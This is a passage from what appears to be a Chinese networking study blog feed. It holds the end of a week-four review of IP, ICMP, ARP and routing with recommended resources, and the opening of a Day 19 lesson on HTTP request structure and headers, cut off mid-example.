href="#理论知识" class="headerlink" title="理论知识"></a>理论知识</h3><ul><li>✅ 深入理解IP协议（IPv4&#x2F;IPv6）</li><li>✅ 掌握子网划分和路由</li><li>✅ 理解ICMP和ARP协议</li><li>✅ 了解动态路由协议</li><li>✅ 掌握网络诊断方法</li></ul><h3 id="实践能力"><a href="#实践能力" class="headerlink" title="实践能力"></a>实践能力</h3><ul><li>✅ 原始套接字编程</li><li>✅ 网络协议实现</li><li>✅ 数据包构造和解析</li><li>✅ 网络诊断和排错</li><li>✅ 性能优化</li></ul><h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><ul><li>✅ ping、traceroute熟练使用</li><li>✅ ARP、route命令掌握</li><li>✅ tcpdump抓包分析</li><li>✅ 网络配置命令</li></ul><hr><h2 id="📊-学习统计"><a href="#📊-学习统计" class="headerlink" title="📊 学习统计"></a>📊 学习统计</h2><h3 id="时间分配"><a href="#时间分配" class="headerlink" title="时间分配"></a>时间分配</h3><ul><li>理论学习：35%</li><li>编码实践：45%</li><li>调试测试：20%</li></ul><h3 id="代码量"><a href="#代码量" class="headerlink" title="代码量"></a>代码量</h3><ul><li>理论文档：约10000行</li><li>实战代码：约4000行</li><li>总计：约14000行</li></ul><h3 id="项目数量"><a href="#项目数量" class="headerlink" title="项目数量"></a>项目数量</h3><ul><li>完整项目：6个</li><li>小型demo：10+个</li><li>练习题：20+道</li></ul><hr><h2 id="🎓-学习建议"><a href="#🎓-学习建议" class="headerlink" title="🎓 学习建议"></a>🎓 学习建议</h2><h3 id="巩固知识"><a href="#巩固知识" class="headerlink" title="巩固知识"></a>巩固知识</h3><ol><li><p><strong>复习核心概念</strong></p><ul><li>IP地址和子网划分</li><li>路由表查找过程</li><li>ARP工作流程</li><li>ICMP消息类型</li></ul></li><li><p><strong>动手实践</strong></p><ul><li>重写关键项目</li><li>配置实际网络设备</li><li>解决实际网络问题</li><li>优化网络性能</li></ul></li><li><p><strong>深入理解</strong></p><ul><li>阅读RFC文档<ul><li>RFC 791: IP</li><li>RFC 792: ICMP</li><li>RFC 826: ARP</li><li>RFC 2453: RIP</li><li>RFC 2328: OSPF</li></ul></li><li>查看Linux内核网络栈源码</li><li>分析真实网络流量</li></ul></li></ol><h3 id="扩展学习"><a href="#扩展学习" class="headerlink" title="扩展学习"></a>扩展学习</h3><ol><li><p><strong>网络模拟</strong></p><ul><li>GNS3：网络设备模拟</li><li>Packet Tracer：Cisco模拟器</li><li>EVE-NG：多厂商模拟</li></ul></li><li><p><strong>高级路由</strong></p><ul><li>BGP协议</li><li>MPLS</li><li>VRF</li><li>路由策略</li></ul></li><li><p><strong>SDN（软件定义网络）</strong></p><ul><li>OpenFlow</li><li>ONOS&#x2F;ODL控制器</li><li>P4编程</li></ul></li><li><p><strong>网络自动化</strong></p><ul><li>Ansible网络模块</li><li>Python Netmiko</li><li>NETCONF&#x2F;RESTCONF</li></ul></li></ol><hr><h2 id="🚀-下周预告"><a href="#🚀-下周预告" class="headerlink" title="🚀 下周预告"></a>🚀 下周预告</h2><p><strong>第五周：网络安全基础（Day 28-35）</strong></p><h3 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h3><ul><li>网络安全概述</li><li>防火墙技术（iptables&#x2F;nftables）</li><li>VPN和隧道技术</li><li>入侵检测系统（IDS&#x2F;IPS）</li><li>SSL&#x2F;TLS深入</li><li>网络攻击和防御</li><li>安全加固</li><li>综合安全项目</li></ul><h3 id="学习目标"><a href="#学习目标" class="headerlink" title="学习目标"></a>学习目标</h3><ul><li>理解网络安全威胁</li><li>掌握防护技术</li><li>学习安全工具</li><li>实现安全项目</li><li>培养安全意识</li></ul><h3 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h3><ul><li>复习本周内容</li><li>了解常见网络攻击</li><li>准备虚拟机环境</li><li>阅读安全相关文档</li></ul><hr><h2 id="💡-本周总结"><a href="#💡-本周总结" class="headerlink" title="💡 本周总结"></a>💡 本周总结</h2><h3 id="主要成就"><a href="#主要成就" class="headerlink" title="主要成就"></a>主要成就</h3><p>✅ 完整学习网络层协议<br>✅ 理解IP寻址和路由<br>✅ 掌握网络诊断工具<br>✅ 实现6个实战项目<br>✅ 学会网络排错方法</p><h3 id="关键收获"><a href="#关键收获" class="headerlink" title="关键收获"></a>关键收获</h3><ol><li><p><strong>IP协议是网络的基础</strong></p><ul><li>地址是网络的身份证</li><li>路由是网络的导航系统</li><li>子网划分是资源的合理分配</li></ul></li><li><p><strong>诊断工具很重要</strong></p><ul><li>ping测试连通性</li><li>traceroute追踪路径</li><li>系统化排错方法</li></ul></li><li><p><strong>安全不容忽视</strong></p><ul><li>ARP欺骗威胁很大</li><li>交换机安全配置必要</li><li>加密通信很重要</li></ul></li><li><p><strong>动态路由更智能</strong></p><ul><li>自动适应网络变化</li><li>提供冗余和负载均衡</li><li>适合大型网络</li></ul></li></ol><h3 id="待提升领域"><a href="#待提升领域" class="headerlink" title="待提升领域"></a>待提升领域</h3><ul><li>BGP等高级路由协议</li><li>大规模网络设计</li><li>SDN软件定义网络</li><li>网络编程优化</li></ul><hr><h2 id="📝-学习心得"><a href="#📝-学习心得" class="headerlink" title="📝 学习心得"></a>📝 学习心得</h2><p><strong>本周是网络学习的核心周之一</strong>，我们深入学习了网络层协议，理解了互联网的工作原理。</p><p><strong>IP协议</strong>是整个互联网的基石。从IPv4到IPv6，从地址分配到路由转发，每个细节都至关重要。理解了IP，就理解了数据如何在全球网络中传输。</p><p><strong>ICMP协议</strong>虽然简单，但作用巨大。ping和traceroute等诊断工具基于ICMP，是我们排查网络问题的利器。</p><p><strong>ARP协议</strong>连接了网络层和链路层，是本地网络通信的关键。同时ARP安全问题提醒我们，网络安全无小事。</p><p><strong>路由协议</strong>让网络变得智能。从简单的静态路由到复杂的动态路由，网络能够自动适应变化，这是互联网能够如此庞大而稳定的原因之一。</p><p><strong>实践是检验真理的唯一标准</strong>。通过编写ping、traceroute、ARP工具，我们不仅理解了协议原理，更掌握了实现细节。</p><p><strong>系统化的思维很重要</strong>。网络排错不是盲目尝试，而是按照OSI模型从底层到高层，从近到远，逐步定位问题。</p><hr><h2 id="🌟-激励语录"><a href="#🌟-激励语录" class="headerlink" title="🌟 激励语录"></a>🌟 激励语录</h2><blockquote><p>“网络协议就像语言，只有真正使用，才能真正掌握。”</p></blockquote><p>本周的学习强度很大，但收获也很大。你已经掌握了网络层的核心知识，能够独立诊断和解决大部分网络问题。</p><p>继续保持学习的热情！四周下来，你已经建立了从物理层到网络层的完整知识体系。</p><p>下周我们将进入激动人心的网络安全领域，学习如何保护网络免受攻击。这是网络工程师必备的技能！</p><p>加油！💪</p><hr><p><strong>学习进度：27&#x2F;180天（15.0%）</strong></p><p><strong>已完成：4周</strong><br><strong>剩余：22周</strong></p><hr><h2 id="📚-推荐资源"><a href="#📚-推荐资源" class="headerlink" title="📚 推荐资源"></a>📚 推荐资源</h2><h3 id="书籍"><a href="#书籍" class="headerlink" title="书籍"></a>书籍</h3><ul><li>《TCP&#x2F;IP详解 卷1：协议》- 经典必读</li><li>《计算机网络》（谢希仁）- 中文教材</li><li>《CCNA学习指南》- 实用配置</li><li>《Wireshark网络分析就这么简单》- 抓包分析</li></ul><h3 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源"></a>在线资源</h3><ul><li>RFC Editor: <a href="https://www.rfc-editor.org/">https://www.rfc-editor.org</a></li><li>IPv6教育网站: <a href="https://www.ipv6.com/">https://www.ipv6.com</a></li><li>子网划分计算器: <a href="http://www.subnet-calculator.com/">http://www.subnet-calculator.com</a></li><li>Cisco学习网络: <a href="https://www.cisco.com/c/en/us/training-events/training-certifications.html">https://www.cisco.com/c/en/us/training-events/training-certifications.html</a></li></ul><h3 id="实践平台"><a href="#实践平台" class="headerlink" title="实践平台"></a>实践平台</h3><ul><li>GNS3: <a href="https://www.gns3.com/">https://www.gns3.com</a></li><li>Packet Tracer: <a href="https://www.netacad.com/courses/packet-tracer">https://www.netacad.com/courses/packet-tracer</a></li><li>Hack The Box: <a href="https://www.hackthebox.eu(安全实践)/">https://www.hackthebox.eu（安全实践）</a></li></ul><h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><ul><li>YouTube: NetworkChuck, David Bombal</li><li>Bilibili: 搜索”计算机网络”、”网络协议”</li></ul><hr><p><strong>继续加油！下周见！</strong> 🚀</p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>19天：HTTP协议基础</title>
    <link href="/2025/11/10/19%E5%A4%A9%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/"/>
    <url>/2025/11/10/19%E5%A4%A9%EF%BC%9AHTTP%E5%8D%8F%E8%AE%AE%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="第19天：HTTP协议基础"><a href="#第19天：HTTP协议基础" class="headerlink" title="第19天：HTTP协议基础"></a>第19天：HTTP协议基础</h1><h2 id="今日目标"><a href="#今日目标" class="headerlink" title="今日目标"></a>今日目标</h2><ul><li>理解HTTP协议的工作原理</li><li>掌握HTTP请求和响应格式</li><li>学习HTTP方法和状态码</li><li>了解HTTP头部字段</li><li>理解Cookie和Session机制</li><li>学习HTTP版本演进</li><li>实现简单的HTTP服务器</li></ul><hr><h2 id="1-HTTP协议概述"><a href="#1-HTTP协议概述" class="headerlink" title="1. HTTP协议概述"></a>1. HTTP协议概述</h2><h3 id="1-1-什么是HTTP？"><a href="#1-1-什么是HTTP？" class="headerlink" title="1.1 什么是HTTP？"></a>1.1 什么是HTTP？</h3><p><strong>HTTP（HyperText Transfer Protocol）</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs markdown">HTTP = 超文本传输协议<br><br>生活类比：<br>HTTP就像邮寄系统：<br><span class="hljs-bullet">1.</span> 你写信（HTTP请求）<br><span class="hljs-bullet">2.</span> 邮递员送信（网络传输）<br><span class="hljs-bullet">3.</span> 收信人回复（HTTP响应）<br><span class="hljs-bullet">4.</span> 邮递员送回回信（网络传输）<br><br>特点：<br><span class="hljs-bullet">-</span> 文本协议（可读性强）<br><span class="hljs-bullet">-</span> 无状态（每次请求独立）<br><span class="hljs-bullet">-</span> 客户端-服务器模型<br><span class="hljs-bullet">-</span> 基于TCP（可靠传输）<br></code></pre></td></tr></table></figure><p><strong>HTTP的位置</strong>：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs armasm">应用层协议栈：<br><br>┌────────────────────────────┐<br>│  应用程序（浏览器、APP）    │<br>├────────────────────────────┤<br>│  HTTP（应用层协议）         │<br>├────────────────────────────┤<br>│  TCP（传输层协议）          │<br>├────────────────────────────┤<br>│  <span class="hljs-built_in">IP</span>（网络层协议）           │<br>├────────────────────────────┤<br>│  物理层                     │<br>└────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="1-2-HTTP工作流程"><a href="#1-2-HTTP工作流程" class="headerlink" title="1.2 HTTP工作流程"></a>1.2 HTTP工作流程</h3><p><strong>基本流程</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs markdown">客户端（浏览器）                    服务器<br><br><span class="hljs-bullet">    1.</span> DNS解析<br><span class="hljs-code">       www.example.com → 93.184.216.34</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">    2.</span> 建立TCP连接<br><span class="hljs-code">       ─────────────────────────&gt;</span><br><span class="hljs-code">       三次握手</span><br><span class="hljs-code">       &lt;─────────────────────────</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">    3.</span> 发送HTTP请求<br><span class="hljs-code">       GET /index.html HTTP/1.1</span><br><span class="hljs-code">       Host: www.example.com</span><br><span class="hljs-code">       ─────────────────────────&gt;</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">    4.</span> 服务器处理请求<br><span class="hljs-bullet">                                  -</span> 解析请求<br><span class="hljs-bullet">                                  -</span> 查找资源<br><span class="hljs-bullet">                                  -</span> 生成响应<br><br><span class="hljs-bullet">    5.</span> 返回HTTP响应<br><span class="hljs-code">       &lt;─────────────────────────</span><br><span class="hljs-code">       HTTP/1.1 200 OK</span><br><span class="hljs-code">       Content-Type: text/html</span><br><span class="hljs-code"></span><br><span class="hljs-code">       &lt;html&gt;...&lt;/html&gt;</span><br><span class="hljs-code"></span><br><span class="hljs-bullet">    6.</span> 关闭连接（HTTP/1.0）<br><span class="hljs-code">       或保持连接（HTTP/1.1）</span><br></code></pre></td></tr></table></figure><p><strong>详细步骤</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 用户输入URL：http://www.example.com/index.html<br><br><span class="hljs-bullet">2.</span> 浏览器解析URL：<br><span class="hljs-bullet">   -</span> 协议：http<br><span class="hljs-bullet">   -</span> 主机：www.example.com<br><span class="hljs-bullet">   -</span> 端口：80（默认）<br><span class="hljs-bullet">   -</span> 路径：/index.html<br><br><span class="hljs-bullet">3.</span> DNS查询：<br><span class="hljs-bullet">   -</span> 查询www.example.com的IP地址<br><span class="hljs-bullet">   -</span> 得到：93.184.216.34<br><br><span class="hljs-bullet">4.</span> 建立TCP连接：<br><span class="hljs-bullet">   -</span> 连接到 93.184.216.34:80<br><span class="hljs-bullet">   -</span> 三次握手<br><br><span class="hljs-bullet">5.</span> 发送HTTP请求：<br><span class="hljs-bullet">   -</span> 请求行：GET /index.html HTTP/1.1<br><span class="hljs-bullet">   -</span> 请求头：Host, User-Agent等<br><span class="hljs-bullet">   -</span> 空行<br><span class="hljs-bullet">   -</span> 请求体（如果有）<br><br><span class="hljs-bullet">6.</span> 服务器处理：<br><span class="hljs-bullet">   -</span> 解析请求<br><span class="hljs-bullet">   -</span> 找到/index.html文件<br><span class="hljs-bullet">   -</span> 读取文件内容<br><br><span class="hljs-bullet">7.</span> 发送HTTP响应：<br><span class="hljs-bullet">   -</span> 状态行：HTTP/1.1 200 OK<br><span class="hljs-bullet">   -</span> 响应头：Content-Type, Content-Length等<br><span class="hljs-bullet">   -</span> 空行<br><span class="hljs-bullet">   -</span> 响应体（HTML内容）<br><br><span class="hljs-bullet">8.</span> 浏览器渲染：<br><span class="hljs-bullet">   -</span> 解析HTML<br><span class="hljs-bullet">   -</span> 加载CSS、JavaScript、图片等<br><span class="hljs-bullet">   -</span> 渲染页面<br></code></pre></td></tr></table></figure><h3 id="1-3-HTTP特点"><a href="#1-3-HTTP特点" class="headerlink" title="1.3 HTTP特点"></a>1.3 HTTP特点</h3><p><strong>无状态（Stateless）</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br>服务器不会记住之前的请求<br><br>生活类比：<br>你每次去银行取钱，柜员都不认识你<br>每次都要重新验证身份<br><br>问题：<br><span class="hljs-bullet">- </span>无法识别用户<br><span class="hljs-bullet">- </span>无法保持登录状态<br><br>解决方案：<br><span class="hljs-bullet">- </span>Cookie<br><span class="hljs-bullet">- </span>Session<br><span class="hljs-bullet">- </span>Token<br></code></pre></td></tr></table></figure><p><strong>明文传输</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs">优点：<br>✅ 易于调试<br>✅ 中间设备可以缓存<br>✅ 简单直观<br><br>缺点：<br>❌ 不安全（可被窃听）<br>❌ 敏感信息暴露<br><br>解决方案：<br>使用HTTPS（HTTP + TLS/SSL）<br></code></pre></td></tr></table></figure><p><strong>请求-响应模式</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">特点：<br><span class="hljs-bullet">- </span>客户端主动发起请求<br><span class="hljs-bullet">- </span>服务器被动响应<br><span class="hljs-bullet">- </span>一个请求对应一个响应<br><br>限制：<br><span class="hljs-bullet">- </span>服务器无法主动推送<br><span class="hljs-bullet">- </span>实时性较差<br><br>解决方案：<br><span class="hljs-bullet">- </span>长轮询（Long Polling）<br><span class="hljs-bullet">- </span>WebSocket<br><span class="hljs-bullet">- </span>Server-Sent Events (SSE)<br></code></pre></td></tr></table></figure><hr><h2 id="2-HTTP请求格式"><a href="#2-HTTP请求格式" class="headerlink" title="2. HTTP请求格式"></a>2. HTTP请求格式</h2><h3 id="2-1-请求格式概览"><a href="#2-1-请求格式概览" class="headerlink" title="2.1 请求格式概览"></a>2.1 请求格式概览</h3><p><strong>完整的HTTP请求</strong>：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">GET <span class="hljs-symbol">/index.html</span> HTTP<span class="hljs-symbol">/1.1</span>              ← 请求行<br><span class="hljs-params">Host:</span> www.example.com                 ← 请求头<br><span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span>               ← 请求头<br><span class="hljs-params">Accept:</span> text<span class="hljs-symbol">/html</span>                     ← 请求头<br><span class="hljs-params">Connection:</span> keep-alive                ← 请求头<br>                                      ← 空行（CRLF）<br>[请求体，如果有的话]                   ← 请求体<br></code></pre></td></tr></table></figure><p><strong>结构</strong>：</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs vbscript">┌────────────────────────────────┐<br>│  请求行（<span class="hljs-built_in">Request</span> Line）         │<br>├────────────────────────────────┤<br>│  请求头（<span class="hljs-built_in">Request</span> Headers）      │<br>│  ...                           │<br>├────────────────────────────────┤<br>│  空行（CRLF）                   │<br>├────────────────────────────────┤<br>│  请求体（<span class="hljs-built_in">Request</span> Body）         │<br>│  （可选，<span class="hljs-keyword">GET</span>请求通常没有）       │<br>└────────────────────────────────┘<br></code></pre></td></tr></table></figure><h3 id="2-2-请求行"><a href="#2-2-请求行" class="headerlink" title="2.2 请求行"></a>2.2 请求行</h3><p><strong>格式</strong>：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix">方法 URI HTTP版本<br><br>示例：<br>GET <span class="hljs-symbol">/index.html</span> HTTP<span class="hljs-symbol">/1.1</span><br>POST <span class="hljs-symbol">/api/login</span> HTTP<span class="hljs-symbol">/1.1</span><br>PUT <span class="hljs-symbol">/api/users/123</span> HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><br></code></pre></td></tr></table></figure><p><strong>组成部分</strong>：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> 方法（Method）<br><span class="hljs-bullet">   -</span> GET：获取资源<br><span class="hljs-bullet">   -</span> POST：提交数据<br><span class="hljs-bullet">   -</span> PUT：更新资源<br><span class="hljs-bullet">   -</span> DELETE：删除资源<br><span class="hljs-bullet">   -</span> HEAD：获取头部<br><span class="hljs-bullet">   -</span> OPTIONS：查询支持的方法<br><span class="hljs-bullet">   -</span> TRACE：追踪请求<br><span class="hljs-bullet">   -</span> CONNECT：建立隧道<br><br><span class="hljs-bullet">2.</span> URI（统一资源标识符）<br><span class="hljs-bullet">   -</span> 路径：/index.html<br><span class="hljs-bullet">   -</span> 查询参数：?name=Alice&amp;age=20<br><span class="hljs-bullet">   -</span> 片段：#section1（不发送到服务器）<br><br><span class="hljs-bullet">3.</span> HTTP版本<br><span class="hljs-bullet">   -</span> HTTP/1.0：早期版本<br><span class="hljs-bullet">   -</span> HTTP/1.1：当前主流<br><span class="hljs-bullet">   -</span> HTTP/2：二进制协议<br><span class="hljs-bullet">   -</span> HTTP/3：基于QUIC<br></code></pre></td></tr></table></figure><h3 id="2-3-请求头"><a href="#2-3-请求头" class="headerlink" title="2.3 请求头"></a>2.3 请求头</h3><p><strong>常用请求头</strong>：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">:</span> <span class="hljs-string">www.example.com</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">指定服务器域名（必需）</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">HTTP/1.1要求必须有</span><br><br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">客户端信息（浏览器、操作系统）</span><br><br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">:</span> <span class="hljs-string">text/html,application/json</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">客户端可接受的内容类型</span><br><br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">:</span> <span class="hljs-string">gzip, deflate, br</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">客户端支持的压缩格式</span><br><br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">:</span> <span class="hljs-string">zh-CN,zh;q=0.9,en;q=0.8</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">客户端首选语言</span><br><br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">:</span> <span class="hljs-string">keep-alive</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">连接管理</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">keep-alive：保持连接</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">close：关闭连接</span><br><br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">:</span> <span class="hljs-string">application/json</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">请求体的MIME类型</span><br><br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">:</span> <span class="hljs-string">123</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">请求体的长度（字节）</span><br><br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">:</span> <span class="hljs-string">session_id=abc123; user=Alice</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">发送Cookie给服务器</span><br><br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Bearer eyJhbGc...</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">身份认证信息</span><br><br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">https://www.google.com/</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">来源页面（从哪个页面跳转）</span><br><br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">:</span> <span class="hljs-string">no-cache</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">缓存控制</span><br><br><span class="hljs-attribute">If-Modified-Since</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Wed, 21 Oct 2015 07:28:00 GMT</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">条件请求（只在修改后才返回）</span><br></code></pre></td></tr></table></figure><h3 id="2-4-请求体"><a href="#2-4-请求体" class="headerlink" title="2.4 请求体"></a>2.4 请求体</h3><p><strong>何时有请求体</strong>：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">有请求体的方法：<br><span class="hljs-bullet">- </span>POST：提交表单、上传文件<br><span class="hljs-bullet">- </span>PUT：更新资源<br><span class="hljs-bullet">- </span>PATCH：部分更新<br><br>没有请求体的方法：<br><span class="hljs-bullet">- </span>GET：通过URL传参<br><span class="hljs-bullet">- </span>DELETE：通常不需要<br><span class="hljs-bullet">- </span>HEAD：只要头部<br></code></pre></td></tr></table></figure><p><strong>常见Content-Type</strong>：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs 